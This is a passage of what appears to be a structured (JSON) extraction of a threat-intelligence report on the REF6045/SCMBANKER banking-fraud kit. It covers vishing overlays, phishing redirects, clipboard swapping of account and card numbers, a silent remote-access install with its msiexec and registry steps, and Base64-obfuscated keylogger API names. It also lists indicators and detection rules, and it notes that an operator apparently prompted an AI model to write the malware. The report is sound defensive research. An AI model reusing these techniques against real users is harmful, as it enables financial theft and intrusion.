+   "text": "SCMBANKER configuration mapping victim IP addresses to vishing lock-screen pages",
+   "type": "paragraph",
+   "section": "The vishing engine: turning infections into live phone scams"
+  },
+  {
+   "id": "b106",
+   "page": null,
+   "text": "The operator can choose between two overlay behaviors.",
+   "type": "paragraph",
+   "section": "The vishing engine: turning infections into live phone scams"
+  },
+  {
+   "id": "b107",
+   "page": null,
+   "text": "mensaje.ps1 creates a borderless, topmost WebBrowser window, confines the mouse to the form, and uses a 200 ms timer to bring the overlay back to the foreground if the victim clicks away.",
+   "type": "list",
+   "section": "The vishing engine: turning infections into live phone scams"
+  },
+  {
+   "id": "b108",
+   "page": null,
+   "text": "mensajeoff.ps1 uses a more normal-looking window that cannot be closed and automatically undoes every attempt to dismiss, move, resize, or minimize it. Triggered when the URL ends with ?off.",
+   "type": "list",
+   "section": "The vishing engine: turning infections into live phone scams"
+  },
+  {
+   "id": "b109",
+   "page": null,
+   "text": "The content of those pages completes the social engineering loop: the victim sees a fake bank warning and is prompted to call an operator. One observed page, http://68.211.161[.]46/driver.html?off, links to a Remote Utilities payload, connecting the vishing prompt directly to hands-on access.",
+   "type": "paragraph",
+   "section": "The vishing engine: turning infections into live phone scams"
+  },
+  {
+   "id": "b110",
+   "page": null,
+   "text": "Fake bank security warning pages SCMBANKER shows victims during vishing session",
+   "type": "paragraph",
+   "section": "The vishing engine: turning infections into live phone scams"
+  },
+  {
+   "id": "b111",
+   "page": null,
+   "text": "Active browser redirects to phishing pages",
+   "type": "heading",
+   "level": 3,
+   "section": "Active browser redirects to phishing pages"
+  },
+  {
+   "id": "b112",
+   "page": null,
+   "text": "Unlike the banking monitor, the redirect module only engages victims the operator has explicitly queued for phishing. remo.ps1 polls https://negratomasa2026[.]online/b/<redacted>.txt every 5 minutes, and only victims whose public IP appears in that file launch the second monitor, jujuzkt2.ps1.",
+   "type": "paragraph",
+   "section": "Active browser redirects to phishing pages"
+  },
+  {
+   "id": "b113",
+   "page": null,
+   "text": "jujuzkt2.ps1 watches window titles against https://negratomasa2026[.]online/b/urlsscams.txt (archived list here) and, when a configured URL exists, places the phishing URL on the clipboard, focuses the browser, sends keypresses (Ctrl+L, Ctrl+V, and Enter), then pauses before continuing.",
+   "type": "paragraph",
+   "section": "Active browser redirects to phishing pages"
+  },
+  {
+   "id": "b114",
+   "page": null,
+   "text": "Many urlsscams.txt entries currently end with an empty URL, which suggests target coverage was planned ahead of the completed vishing pages.",
+   "type": "paragraph",
+   "section": "Active browser redirects to phishing pages"
+  },
+  {
+   "id": "b115",
+   "page": null,
+   "text": "An observed redirect destination, https://bancaporinternetbbmx[.]online, also includes a page-load Telegram notification script. When the phishing page opens, the script forces IPv4 resolution, collects browser and device details, and sends the profile to a Telegram chat. This gives the operator immediate confirmation that a redirected victim has reached the lure and has enough context to prioritize live follow-up.",
+   "type": "paragraph",
+   "section": "Active browser redirects to phishing pages"
+  },
+  {
+   "id": "b116",
+   "page": null,
+   "text": "JavaScript code sending victim device and location data to Telegram on a SCMBANKER phishing page",
+   "type": "paragraph",
+   "section": "Active browser redirects to phishing pages"
+  },
+  {
+   "id": "b117",
+   "page": null,
+   "text": "Clipboard and transfer manipulation",
+   "type": "heading",
+   "level": 3,
+   "section": "Clipboard and transfer manipulation"
+  },
+  {
+   "id": "b118",
+   "page": null,
+   "text": "The clipboard modules focus on payment redirection rather than credential theft.",
+   "type": "paragraph",
+   "section": "Clipboard and transfer manipulation"
+  },
+  {
+   "id": "b119",
+   "page": null,
+   "text": "clip.ps1 checks the clipboard every 300 milliseconds for 18-digit CLABE account numbers, then matches the first three digits against the Mexican bank prefix and can replace the destination account with an attacker-controlled CLABE from https://negratomasa2026[.]online/b/clabes.txt.",
+   "type": "list",
+   "section": "Clipboard and transfer manipulation"
+  },
+  {
+   "id": "b120",
+   "page": null,
+   "text": "clip2.ps1 applies the same process to 16-digit card numbers, matches on the six-digit bank identification numbers, and replaces them with values from https://negratomasa2026[.]online/b/tarjetas.txt.",
+   "type": "list",
+   "section": "Clipboard and transfer manipulation"
+  },
+  {
+   "id": "b121",
+   "page": null,
+   "text": "SCMBANKER's clip.ps1 and clip2.ps1 scripts hijacking CLABE and card numbers",
+   "type": "paragraph",
+   "section": "Clipboard and transfer manipulation"
+  },
+  {
+   "id": "b122",
+   "page": null,
+   "text": "How does the operator get hands-on access to a victim's machine?",
+   "type": "heading",
+   "level": 3,
+   "section": "How does the operator get hands-on access to a victim's machine?"
+  },
+  {
+   "id": "b123",
+   "page": null,
+   "text": "SCMBANKER gives the operator direct, hands-on-keyboard control by installing a remote-access tool. Rather than build one, REF6045 repurposes Remote Utilities Host, a legitimate commercial remote-administration product, and configures it silently to call back.",
+   "type": "paragraph",
+   "section": "How does the operator get hands-on access to a victim's machine?"
+  },
+  {
+   "id": "b124",
+   "page": null,
+   "text": "Deployment is operator-triggered and runs through three scripts. The first script (avs.ps1) polls comando.txt every 120 seconds, and when the operator pushes an .msi URL it downloads the installer to C:\\Users\\Public\\ and launches instaler.ps1. This second script (instaler.ps1) exits if the 99.kut guard file already exists so the RAT installs only once, relaunches itself with -Verb RunAs until it gets admin, then installs silently with msiexec /i \"hosts.msi\" /quiet /norestart. On success, it writes REMOTO INSTALADO to agent.txt, drops the 99.kut guard, and runs attrib +h +s \"C:\\Users\\Public\" to hide the implant directory.",
+   "type": "paragraph",
+   "section": "How does the operator get hands-on access to a victim's machine?"
+  },
+  {
+   "id": "b125",
+   "page": null,
+   "text": "Extracted file list from SCMBANKER's Remote Utilities Host remote access installer",
+   "type": "paragraph",
+   "section": "How does the operator get hands-on access to a victim's machine?"
+  },
+  {
+   "id": "b126",
+   "page": null,
+   "text": "The third script (remoto.ps1) waits 120 seconds, then imports a registry blob into HKLM\\SOFTWARE\\Usoris\\Remote Utilities Host\\Host\\Parameters that sets callback auto-connect to the operator (default port 5650, Spanish UI, notifications suppressed, a hardcoded auth key, and SID 46053.045416157).",
+   "type": "paragraph",
+   "section": "How does the operator get hands-on access to a victim's machine?"
+  },
+  {
+   "id": "b127",
+   "page": null,
+   "text": "Decoded registry configuration SCMBANKER uses to auto-connect its remote access tool",
+   "type": "paragraph",
+   "section": "How does the operator get hands-on access to a victim's machine?"
+  },
+  {
+   "id": "b128",
+   "page": null,
+   "text": "It also deletes the UninstallString at HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\{F6688BD5-2126-4F4F-A484-1D05781479B9} so the victim cannot remove it through the traditional Windows menu: Add/Remove Programs.",
+   "type": "paragraph",
+   "section": "How does the operator get hands-on access to a victim's machine?"
+  },
+  {
+   "id": "b129",
+   "page": null,
+   "text": "The result is a persistent, attacker-configured remote desktop that calls home on its own, runs without tray notifications, and resists removal. It is the same payload as the driver.html?off vishing page points victims to, so the social-engineering prompt and the silent install converge on the same hands-on access.",
+   "type": "paragraph",
+   "section": "How does the operator get hands-on access to a victim's machine?"
+  },
+  {
+   "id": "b130",
+   "page": null,
+   "text": "SCMBANKER's self-update mechanism",
+   "type": "heading",
+   "level": 3,
+   "section": "SCMBANKER's self-update mechanism"
+  },
+  {
+   "id": "b131",
+   "page": null,
+   "text": "SCMBANKER includes a self-update mechanism that lets the operator replace the implant from the C2 without rebuilding persistence. edifhjwe.ps1 polls C:\\Users\\Public\\comando.txt (C2 command written by cliente.ps1) every 40 seconds and treats a ZIP URL as an update instruction.",
+   "type": "paragraph",
+   "section": "SCMBANKER's self-update mechanism"
+  },
+  {
+   "id": "b132",
+   "page": null,
+   "text": "When triggered, edifhjwe.ps1 downloads the ZIP to %TEMP%\\Agent_temp.zip, wipes most of C:\\Users\\Public\\, and extracts the new toolkit into place. It preserves a small set of state files, including comando.txt, comentario.txt, id.txt, agent.txt, and 99.kut, so the updated bot keeps its operator notes, infection timestamp, remote-access status, and Remote Utilities install marker.",
+   "type": "paragraph",
+   "section": "SCMBANKER's self-update mechanism"
+  },
+  {
+   "id": "b133",
+   "page": null,
+   "text": "After extraction, the updater writes BOT ACTUALIZADO to comando.txt as a completion flag, kills running PowerShell module processes by script name, and relaunches run.vbs.",
+   "type": "paragraph",
+   "section": "SCMBANKER's self-update mechanism"
+  },
+  {
+   "id": "b134",
+   "page": null,
+   "text": "PowerShell code showing SCMBANKER's self-update module downloading a new toolkit ZIP",
+   "type": "paragraph",
+   "section": "SCMBANKER's self-update mechanism"
+  },
+  {
+   "id": "b135",
+   "page": null,
+   "text": "Is the REF6045 malware written by AI?",
+   "type": "heading",
+   "level": 2,
+   "section": "Is the REF6045 malware written by AI?"
+  },
+  {
+   "id": "b136",
+   "page": null,
+   "text": "The scripts show strong signs of AI assistance, most likely by prompting a large language model in Spanish and then applying manual obfuscation afterward. The code has a split personality, with clean, descriptive function names and heavy explanatory comments sitting next to hand-shortened variables and leftover generation artifacts. The placement of instruction-like comments directly above the code they describe suggests the authors have prompted an inline coding assistant such as Copilot or Cursor.",
+   "type": "paragraph",
+   "section": "Is the REF6045 malware written by AI?"
+  },
+  {
+   "id": "b137",
+   "page": null,
+   "text": "The clearest artifact is a comment sitting directly in the mutation rotator and the keylogger (rotor2.ps1 and key.ps1), which are saturated with aggressive profanity in their comments, while the rest of the kit uses a neutral tone:",
+   "type": "paragraph",
+   "section": "Is the REF6045 malware written by AI?"
+  },
+  {
+   "id": "b138",
+   "page": null,
+   "text": "AI-generated comments in SCMBANKER's rotor2.ps1 script revealing LLM-written malware",
+   "type": "paragraph",
+   "section": "Is the REF6045 malware written by AI?"
+  },
+  {
+   "id": "b139",
+   "page": null,
+   "text": "key.ps1 uses self-documenting obfuscation. It Base64-encodes its Win32 API names to hide them from scanners, then immediately annotates what each one decodes to:",
+   "type": "paragraph",
+   "section": "Is the REF6045 malware written by AI?"
+  },
+  {
+   "id": "b140",
+   "page": null,
+   "text": "$u32b64 = 'dXNlcjMyLmRsbA==' # user32.dll",
+   "type": "code",
+   "section": "Is the REF6045 malware written by AI?",
+   "line_group": "b140"
+  },
+  {
+   "id": "b141",
+   "page": null,
+   "text": "$GASb64 = 'R2V0QXN5bmNLZXlTdGF0ZQ==' # GetAsyncKeyState",
+   "type": "code",
+   "section": "Is the REF6045 malware written by AI?",
+   "line_group": "b140"
+  },
+  {
+   "id": "b142",
+   "page": null,
+   "text": "$GKLb64 = 'R2V0S2V5Ym9hcmRMYXlvdXQ=' # GetKeyboardLayout",
+   "type": "code",
+   "section": "Is the REF6045 malware written by AI?",
+   "line_group": "b140"
+  },
+  {
+   "id": "b143",
+   "page": null,
+   "text": "$TUExb64 = 'VG9Vbmljb2RlRXg=' # ToUnicodeEx",
+   "type": "code",
+   "section": "Is the REF6045 malware written by AI?",
+   "line_group": "b140"
+  },
+  {
+   "id": "b144",
+   "page": null,
+   "text": "Every script opens with heavy banner-comment dividers (INTERVALOS DE TIEMPO, DICCIONARIOS Y VARIABLES, FUNCIONES, INICIO, LOOP PRINCIPAL). This document-like scaffolding is a hallmark of LLM-generated PowerShell and is rarely seen in scripts by experienced developers.",
+   "type": "paragraph",
+   "section": "Is the REF6045 malware written by AI?"
+  },
+  {
+   "id": "b145",
+   "page": null,
+   "text": "Taken together, the evidence points to an operator who prompted a model in Spanish, used profanity and phrasing tricks either out of frustration or to bypass safety filters for the more sensitive components, and pasted the outputs with little review before applying a light manual obfuscation pass. The kit was not generated autonomously, but the model did the heavy lifting on essentially every functional script.",
+   "type": "paragraph",
+   "section": "Is the REF6045 malware written by AI?"
+  },
+  {
+   "id": "b146",
+   "page": null,
+   "text": "As language models become increasingly capable, defenders should expect AI-assisted malware development to become more common, particularly among operators who previously lacked the expertise to implement these capabilities themselves.",
+   "type": "paragraph",
+   "section": "Is the REF6045 malware written by AI?"
+  },
+  {
+   "id": "b147",
+   "page": null,
+   "text": "REF6045's infrastructure and OPSEC failures",
+   "type": "heading",
+   "level": 2,
+   "section": "REF6045's infrastructure and OPSEC failures"
+  },
+  {
+   "id": "b148",
+   "page": null,
+   "text": "The depth of this analysis was made possible by poor server hygiene across the operation. The file server at http://68.211.161[.]46/files/ had directory listing enabled, exposing the PowerShell agent scripts for direct download. The same directory also briefly hosted zkt.zip, which yielded the entire operation in a single archive.",
+   "type": "paragraph",
+   "section": "REF6045's infrastructure and OPSEC failures"
+  },
+  {
+   "id": "b149",
+   "page": null,
+   "text": "Open directory listing exposing SCMBANKER's PowerShell toolkit files for download",
+   "type": "paragraph",
+   "section": "REF6045's infrastructure and OPSEC failures"
+  },
+  {
+   "id": "b150",
+   "page": null,
+   "text": "The C2 also exposed an unauthenticated file editor at /b/editor.php, allowing anyone to directly modify the operation's live targeting configuration files without credentials. The same surface that lets the operator manage victims also lets a visitor read and write the configuration files.",
+   "type": "paragraph",
+   "section": "REF6045's infrastructure and OPSEC failures"
+  },
+  {
+   "id": "b151",
+   "page": null,
+   "text": "Unauthenticated REF6045 file editor exposing live banking fraud targeting configuration",
+   "type": "paragraph",
+   "section": "REF6045's infrastructure and OPSEC failures"
+  },
+  {
+   "id": "b152",
+   "page": null,
+   "text": "The related ClickFix hosts listed earlier reused the same validation.txt delivery pattern while hosting overlapping PowerShell toolsets under /files. Those hosted scripts pointed to separate C2 panels, but the panels shared the same SCM-branded login template, with the latest we’ve seen being SCM v2.0, hence the name SCMBANKER.",
+   "type": "paragraph",
+   "section": "REF6045's infrastructure and OPSEC failures"
+  },
+  {
+   "id": "b153",
+   "page": null,
+   "text": "Three REF6045 command-and-control panels sharing the same SCM banking fraud login template",
+   "type": "paragraph",
+   "section": "REF6045's infrastructure and OPSEC failures"
+  },
+  {
+   "id": "b154",
+   "page": null,
+   "text": "Taken together, the open directories, exposed editor, repeated lure text, overlapping file-server contents, and shared SCM panel branding suggest kit reuse or multiple deployments by the same operator set. We treat the related hosts as infrastructure variants around the same tooling rather than as separate malware families.",
+   "type": "paragraph",
+   "section": "REF6045's infrastructure and OPSEC failures"
+  },
+  {
+   "id": "b155",
+   "page": null,
+   "text": "Why REF6045 matters despite its crude execution",
+   "type": "heading",
+   "level": 2,
+   "section": "Why REF6045 matters despite its crude execution"
+  },
+  {
+   "id": "b156",
+   "page": null,
+   "text": "REF6045 is not a complex operation. The tooling is crude and held together with copy-paste batch files, duplicated bitsadmin jobs, sloppy persistence, self-defeating obfuscation that ships its own key, and a server left wide open with directory listings, a full web-root archive, and an unauthenticated editing panel.",
+   "type": "paragraph",
+   "section": "Why REF6045 matters despite its crude execution"
+  },
+  {
+   "id": "b157",
+   "page": null,
+   "text": "That lack of craftsmanship is partly explained by how the kit was developed. The scripts are littered with numerous AI-generated artifacts, suggesting the operator relied heavily on a large language model to implement much of the functionality. Rather than writing components such as the keylogger or a clipboard hijacker from scratch, the operator prompted a model, pasted the output, and applied a light manual obfuscation pass on top.",
+   "type": "paragraph",
+   "section": "Why REF6045 matters despite its crude execution"
+  },
+  {
+   "id": "b158",
+   "page": null,
+   "text": "Victims are kept as a passive feed while the operator watches a live dashboard and engages only the targets worth the effort, switching on browser redirects, vishing lockdowns, clipboard swaps, or a full RAT by IP, on demand. Crude as it is, SCMBANKER already has real victims. The live victim counter and the labeled, tagged machines on the operator's own panels show that individual people are being actively targeted.",
+   "type": "paragraph",
+   "section": "Why REF6045 matters despite its crude execution"
+  },
+  {
+   "id": "b159",
+   "page": null,
+   "text": "REF6045 through MITRE ATT&CK",
+   "type": "heading",
+   "level": 2,
+   "section": "REF6045 through MITRE ATT&CK"
+  },
+  {
+   "id": "b160",
+   "page": null,
+   "text": "Elastic uses the MITRE ATT&CK framework to document common tactics, techniques, and procedures that threats use against enterprise networks.",
+   "type": "paragraph",
+   "section": "REF6045 through MITRE ATT&CK"
+  },
+  {
+   "id": "b161",
+   "page": null,
+   "text": "Tactics",
+   "type": "heading",
+   "level": 3,
+   "section": "Tactics"
+  },
+  {
+   "id": "b162",
+   "page": null,
+   "text": "Tactics represent the why of a technique or sub-technique. It is the adversary’s tactical goal: the reason for performing an action.",
+   "type": "paragraph",
+   "section": "Tactics"
+  },
+  {
+   "id": "b163",
+   "page": null,
+   "text": "Initial Access",
+   "type": "list",
+   "section": "Tactics"
+  },
+  {
+   "id": "b164",
+   "page": null,
+   "text": "Execution",
+   "type": "list",
+   "section": "Tactics"
+  },
+  {
+   "id": "b165",
+   "page": null,
+   "text": "Persistence",
+   "type": "list",
+   "section": "Tactics"
+  },
+  {
+   "id": "b166",
+   "page": null,
+   "text": "Privilege Escalation",
+   "type": "list",
+   "section": "Tactics"
+  },
+  {
+   "id": "b167",
+   "page": null,
+   "text": "Stealth",
+   "type": "list",
+   "section": "Tactics"
+  },
+  {
+   "id": "b168",
+   "page": null,
+   "text": "Credential Access",
+   "type": "list",
+   "section": "Tactics"
+  },
+  {
+   "id": "b169",
+   "page": null,
+   "text": "Discovery",
+   "type": "list",
+   "section": "Tactics"
+  },
+  {
+   "id": "b170",
+   "page": null,
+   "text": "Collection",
+   "type": "list",
+   "section": "Tactics"
+  },
+  {
+   "id": "b171",
+   "page": null,
+   "text": "Exfiltration",
+   "type": "list",
+   "section": "Tactics"
+  },
+  {
+   "id": "b172",
+   "page": null,
+   "text": "Command and Control",
+   "type": "list",
+   "section": "Tactics"
+  },
+  {
+   "id": "b173",
+   "page": null,
+   "text": "Impact",
+   "type": "list",
+   "section": "Tactics"
+  },
+  {
+   "id": "b174",
+   "page": null,
+   "text": "Techniques",
+   "type": "heading",
+   "level": 3,
+   "section": "Techniques"
+  },
+  {
+   "id": "b175",
+   "page": null,
+   "text": "Techniques represent how an adversary achieves a tactical goal by performing an action.",
+   "type": "paragraph",
+   "section": "Techniques"
+  },
+  {
+   "id": "b176",
+   "page": null,
+   "text": "Phishing: Spearphishing Link",
+   "type": "list",
+   "section": "Techniques"
+  },
+  {
+   "id": "b177",
+   "page": null,
+   "text": "User Execution: Malicious Link",
+   "type": "list",
+   "section": "Techniques"
+  },
+  {
+   "id": "b178",
+   "page": null,
+   "text": "Command and Scripting Interpreter: Windows Command Shell",
+   "type": "list",
+   "section": "Techniques"
+  },
+  {
+   "id": "b179",
+   "page": null,
+   "text": "Command and Scripting Interpreter: PowerShell",
+   "type": "list",
+   "section": "Techniques"
+  },
+  {
+   "id": "b180",
+   "page": null,
+   "text": "Ingress Tool Transfer",
+   "type": "list",
+   "section": "Techniques"
+  },
+  {
+   "id": "b181",
+   "page": null,
+   "text": "BITS Jobs",
+   "type": "list",
+   "section": "Techniques"
+  },
+  {
+   "id": "b182",
+   "page": null,
+   "text": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder",
+   "type": "list",
+   "section": "Techniques"
+  },
+  {
+   "id": "b183",
+   "page": null,
+   "text": "Masquerading: Match Legitimate Name or Location",
+   "type": "list",
+   "section": "Techniques"
+  },
+  {
+   "id": "b184",
+   "page": null,
+   "text": "Hide Artifacts: Hidden Files and Directories",
+   "type": "list",
+   "section": "Techniques"
+  },
+  {
+   "id": "b185",
+   "page": null,
+   "text": "Modify Registry",
+   "type": "list",
+   "section": "Techniques"
+  },
+  {
+   "id": "b186",
+   "page": null,
+   "text": "System Information Discovery",
+   "type": "list",
+   "section": "Techniques"
+  },
+  {
+   "id": "b187",
+   "page": null,
+   "text": "System Network Configuration Discovery",
+   "type": "list",
+   "section": "Techniques"
+  },
+  {
+   "id": "b188",
+   "page": null,
+   "text": "Application Window Discovery",
+   "type": "list",
+   "section": "Techniques"
+  },
+  {
+   "id": "b189",
+   "page": null,
+   "text": "Input Capture: Keylogging",
+   "type": "list",
+   "section": "Techniques"
+  },
+  {
+   "id": "b190",
+   "page": null,
+   "text": "Screen Capture",
+   "type": "list",
+   "section": "Techniques"
+  },
+  {
+   "id": "b191",
+   "page": null,
+   "text": "Clipboard Data",
+   "type": "list",
+   "section": "Techniques"
+  },
+  {
+   "id": "b192",
+   "page": null,
+   "text": "Remote Access Software",
+   "type": "list",
+   "section": "Techniques"
+  },
+  {
+   "id": "b193",
+   "page": null,
+   "text": "Application Layer Protocol: Web Protocols",
+   "type": "list",
+   "section": "Techniques"
+  },
+  {
+   "id": "b194",
+   "page": null,
+   "text": "Web Service",
+   "type": "list",
+   "section": "Techniques"
+  },
+  {
+   "id": "b195",
+   "page": null,
+   "text": "Exfiltration Over C2 Channel",
+   "type": "list",
+   "section": "Techniques"
+  },
+  {
+   "id": "b196",
+   "page": null,
+   "text": "System Shutdown/Reboot",
+   "type": "list",
+   "section": "Techniques"
+  },
+  {
+   "id": "b197",
+   "page": null,
+   "text": "Financial Theft",
+   "type": "list",
+   "section": "Techniques"
+  },
+  {
+   "id": "b198",
+   "page": null,
+   "text": "How to detect and prevent REF6045",
+   "type": "heading",
+   "level": 2,
+   "section": "How to detect and prevent REF6045"
+  },
+  {
+   "id": "b199",
+   "page": null,
+   "text": "Prevention rules for detecting SCMBANKER",
+   "type": "heading",
+   "level": 3,
+   "section": "Prevention rules for detecting SCMBANKER"
+  },
+  {
+   "id": "b200",
+   "page": null,
+   "text": "Suspicious PowerShell Execution via Windows Scripts",
+   "type": "list",
+   "section": "Prevention rules for detecting SCMBANKER"
+  },
+  {
+   "id": "b201",
+   "page": null,
+   "text": "DNS Query to Suspicious Top Level Domain",
+   "type": "list",
+   "section": "Prevention rules for detecting SCMBANKER"
+  },
+  {
+   "id": "b202",
+   "page": null,
+   "text": "Suspicious Bitsadmin Activity",
+   "type": "list",
+   "section": "Prevention rules for detecting SCMBANKER"
+  },
+  {
+   "id": "b203",
+   "page": null,
+   "text": "Suspicious Windows Script Interpreter Child Process",
+   "type": "list",
+   "section": "Prevention rules for detecting SCMBANKER"
+  },
+  {
+   "id": "b204",
+   "page": null,
+   "text": "Execution from Unusual Directory",
+   "type": "list",
+   "section": "Prevention rules for detecting SCMBANKER"
+  },
+  {
+   "id": "b205",
+   "page": null,
+   "text": "External IP Address Discovery via a Trusted Program",
+   "type": "list",
+   "section": "Prevention rules for detecting SCMBANKER"
+  },
+  {
+   "id": "b206",
+   "page": null,
+   "text": "Suspicious String Value Written to Registry Run Key",
+   "type": "list",
+   "section": "Prevention rules for detecting SCMBANKER"
+  },
+  {
+   "id": "b207",
+   "page": null,
+   "text": "Suspicious Command Execution via Windows Run",
+   "type": "list",
+   "section": "Prevention rules for detecting SCMBANKER"
+  },
+  {
+   "id": "b208",
+   "page": null,
+   "text": "Curl HTTP Fetch Piped to Cmd or Node via Command Shell",
+   "type": "list",
+   "section": "Prevention rules for detecting SCMBANKER"
+  },
+  {
+   "id": "b209",
+   "page": null,
+   "text": "Observables",
+   "type": "heading",
+   "level": 2,
+   "section": "Observables"
+  },
+  {
+   "id": "b210",
+   "page": null,
+   "text": "The following observables were discussed in this research.",
+   "type": "paragraph",
+   "section": "Observables"
+  },
+  {
+   "id": "b211",
+   "page": null,
+   "text": "Observable | Type | Name | Reference ¶ 68.211.161[.]46 | ipv4 |  | ClickFix / file host ¶ http://68.211.161[.]46/ | url |  | ClickFix web root ¶ http://68.211.161[.]46/files/ | url |  | Open directory / toolkit staging ¶ http://68.211.161[.]46/validation.txt | url |  | First-stage batch payload download ¶ http://68.211.161[.]46/driver.html?off | url |  | Vishing page linking to Remote Utilities payload ¶ 216.250.112[.]100 | ipv4 |  | ClickFix / file host ¶ http://216.250.112[.]100/validation.txt | url |  | First-stage batch payload download (osogransd variant) ¶ 185.242.246[.]169 | ipv4 |  | REF6045 C2 ¶ https://185.242.246[.]169/b/editor.php | url |  | C2 exposed config editor ¶ http://185.242.246[.]169/dashboard2/recData.php | url |  | C2 beacon POST endpoint (osogransd variant) ¶ ratonvaquero2026[.]online | domain-name |  | ClickFix / file host ¶ https://ratonvaquero2026[.]online/ | url |  | ClickFix lure host ¶ https://ratonvaquero2026[.]online/files/ | url |  | Toolkit file host ¶ monteviral2026.duckdns[.]org | domain-name |  | ClickFix / file host ¶ https://monteviral2026.duckdns[.]org/ | url |  | ClickFix lure host ¶ https://monteviral2026.duckdns[.]org/files/ | url |  | Toolkit file host ¶ osogransd[.]online | domain-name |  | ClickFix / file host ¶ https://osogransd[.]online/ | url |  | ClickFix lure host ¶ https://osogransd[.]online/files/ | url |  | Toolkit file host ¶ negratomasa2026[.]online | domain-name |  | REF6045 C2 ¶ https://negratomasa2026[.]online/dashboard2/recData.php | url |  | C2 beacon POST endpoint ¶ https://negratomasa2026[.]online/dashboard2/avisos2.php | url |  | Banking session alert endpoint ¶ https://negratomasa2026[.]online/dashboard2/imagenes.php | url |  | Screenshot upload endpoint ¶ https://negratomasa2026[.]online/dashboard2/logs.php | url |  | Keylogger exfil endpoint ¶ https://negratomasa2026[.]online/a/teleavisos.txt | url |  | Remote config (arbitrary PowerShell) ¶ https://negratomasa2026[.]online/b/listadebancos.txt | url |  | Banking window-title keywords ¶ https://negratomasa2026[.]online/b/keysnegativas.txt | url |  | Negative keyword filter config ¶ https://negratomasa2026[.]online/a/telekeylogger.txt | url |  | Telegram keylogger credentials config ¶ https://negratomasa2026[.]online/b/urlsscams.txt | url |  | Phishing redirect target list ¶ https://negratomasa2026[.]online/b/clabes.txt | url |  | CLABE replacement values ¶ https://negratomasa2026[.]online/b/tarjetas.txt | url |  | Card-number replacement values ¶ https://negratomasa2026[.]online/b/editor.php | url |  | C2 exposed config editor ¶ gestionmontelavaria2026[.]online | domain-name |  | REF6045 C2 ¶ https://gestionmontelavaria2026[.]online/dashboard2/recData.php | url |  | C2 beacon POST endpoint (monteviral variant) ¶ https://gestionmontelavaria2026[.]online/b/editor.php | url |  | C2 exposed config editor ¶ ssinvestigaciones[.]com | domain-name |  | ClickFix post-CAPTCHA tracking endpoint ¶ https://ww.ssinvestigaciones[.]com/login3.php | url |  | ClickFix post-CAPTCHA tracking endpoint ¶ bancaporinternetbbmx[.]online | domain-name |  | Phishing page ¶ https://bancaporinternetbbmx[.]online | url |  | Phishing redirect destination ¶ b30cb0aa977aacdab94d2ef503186c8f0b2fc10d7cf0d7c7c0ada70c127dc7e8 | SHA-256 | zkt.zip | Exposed web-root archive ¶ 554f1aefeb698995501751328c2f9fe93f02a680679fba3dd15f1ed93d46bf1b | SHA-256 | validation.txt | First-stage batch payload ¶ ff3555154e91e42490cc722b6c7f3c4c91654b7ef53a35d0719ffb89accf1b27 | SHA-256 | run.vbs | Master launcher ¶ 526287a40aad1b218228cdd1f459ad3b93f858585048347644d597c6ab19515a | SHA-256 | cliente.ps1 | C2 beacon ¶ 685d29ce8a550feb3a9e1d1c5926ec5e927615cf34aab62c108a812a1eb6737c | SHA-256 | jujuzkt.ps1 | Banking activity monitor ¶ 8c87ea94401fa97d3743a87604e088d1a29c7b06cf9673623941a42da68452a6 | SHA-256 | jujuzkt2.ps1 | Active browser redirect module ¶ 6dcd7fdd5e088d98d861cbd1cb74a7b83ae5508f4dbb617413bcbe7fbc8a82e2 | SHA-256 | mensaje1.ps1 | Vishing dispatcher ¶ 4d9c160ebb44507b11f0e6421f691900284f25b5530a23d9fd50de0ae01663ca | SHA-256 | mensaje.ps1 | Hard-lock vishing overlay ¶ 0315d4a7bc14654ad66d4c2b98920b92ca18cbc231b3ce5fba1fcac70b828e19 | SHA-256 | mensajeoff.ps1 | Soft-lock vishing overlay ¶ 5d17645548a44fe39d3cc816ffa3933321c1eb8b08a8f4348e3cd82f25112c81 | SHA-256 | rotor1.ps1 | Screenshot module invoker ¶ 566f4bfdfea54129b8528d50cae187a9030e2f2787749add4b0db22ac35ea581 | SHA-256 | screen2.ps1 | Screenshot module ¶ 882d582e85d5bb7abbdde791a2d52e3b1bb7dd7f79c20318ce64b74249221fdb | SHA-256 | rotor2.ps1 | Vishing dispatcher rotator ¶ eea08fbf3720d638af1d313d3ce369708b77d7891379d5c5871dd7f36667ed0c | SHA-256 | clip.ps1 | CLABE clipboard hijacker ¶ 70140aa236d630a7d5ed08be3dafcccea9a8b0eec6dadf8c1cf1b96d8f608609 | SHA-256 | clip2.ps1 | Card-number clipboard hijacker ¶ 6c8ba7127a83431432e85946976c18bb3f3e9bf9def68aae572cd1d9d73604c7 | SHA-256 | avs.ps1 | Remote Utilities downloader ¶ 81a4512db985359ed361755da58a1177b07632b5aee951c68a6ace54f4d0534b | SHA-256 | instaler.ps1 | Remote Utilities installer launcher ¶ 3d9015429d65276869ceb9c91f10d6474b1098042db75949c49b9f1682c1f3ae | SHA-256 | remoto.ps1 | Remote Utilities configurator ¶ 5bc85b604eb37ffa1e67c57f4744b55ef876a1ab442e2a2440550ef0922aeec7 | SHA-256 | correr.ps1 | Arbitrary PowerShell executor ¶ 30ff24faad80184bb43660a8bd317df99a8d09d31bae3b446aaa876543f2620f | SHA-256 | key.ps1 | Telegram-backed keylogger ¶ 4b7b35b921d7615b7a82a42c379560d1b0c5a74c81311a269874195ba2744f2d | SHA-256 | cursor2.exe | Invisible-cursor utility ¶ 5c7ab9e90b05804d07e9d803f85462bc1a44d0726256bad28219984ee2b5772f | SHA-256 | cursor2.exe | Invisible cursor resource dropped by cursor2.exe ¶ 32d981b3e7c36aa7030cfd9ee412bff742e00b36c39c80634b2681f89de4a487 | SHA-256 | hosts.msi | Remote Utilities installer ¶ cd7b179dd98848a02b9a1d4ebfeee26cdbb317b4ad53eb50786e18515b0cf804 | SHA-256 | ini.ps1 | Delayed launcher ¶ 345e8a90b7b762b065333cd068811d88086d157be713d89bdf200c927645f3d8 | SHA-256 | remo.ps1 | IP-gated launcher ¶ 0ec9b518f84b6bdc0e843b89fa755522ec67db862414ad16bdcaa8c2be25485c | SHA-256 | edifhjwe.ps1 | Self-updater ¶ 26f906a2a4276b1968a8ce956a7b342aa9bc26f60d32c14668223877f569fb3f | SHA-256 | rotor.ps1 | Keylogger rotator ¶ 13bfd0f695cea1d6ae570a7ca056ffe930467be73a26f29f95209618f383bd2d | SHA-256 | 4.bat | Early version of run.vbs",
+   "type": "table",
+   "table": {
+    "rows": [
+     [
